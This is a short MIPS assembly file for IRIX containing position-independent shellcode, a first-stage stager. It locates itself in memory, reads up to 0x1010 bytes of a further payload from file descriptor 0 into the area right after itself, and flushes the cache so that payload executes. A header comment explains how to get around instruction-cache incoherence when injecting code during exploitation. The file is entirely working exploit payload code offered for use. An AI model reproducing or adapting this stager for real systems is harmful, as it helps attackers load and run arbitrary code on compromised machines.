/* MIPS/IRIX PIC read/cacheflush code
 *
 * -sc.
 *
 * some note:
 * since the data that is read in is treated in the data cache, you may
 * experience a data/instruction cache incoherence, where the instruction
 * cache still contains the old memory contents. to avoid this, send a lot
 * of data, first the shellcode and then a huge bogus space of nops, which
 * are to flush the data cache, later making the instruction cache populated
 * with the real shellcode. or do it as we do it here, use a cacheflush
 * syscall. this is only possible if this code is already in icache, so for
 * the usual exploitation situation that does not help much.
 */

#include <sgidefs.h>
#include <sys/regdef.h>
#include <sys/asm.h>
#include <sys.s>
#include <sys/syscall.h>

	.section .text

	.globl	cbegin
	.globl	cend

cbegin:
	.set	noreorder
	.set	nomacro

foo:	bltzal	zero, foo
	slti	a0, zero, -1

	addu	ra, ra, (0x0101 + 48)
	subu	a1, ra, 0x0101

	li	a2, 0x1010	/* read 0x1010 bytes max */
	li	v0, SYS_read
	syscall

	subu	a0, ra, 0x0101	/* data was read to here */
	li	a1, 0x1010	/* should be cacheline aligned */
	li	t2, -4
	not	a2, t2		/* BCACHE = 0x03 */
	li	v0, SYS_cachectl	/* 0x047e */
	syscall
	li	t8, 0x7350	/* has to be a sane bds */

	.end	cbegin
cend:

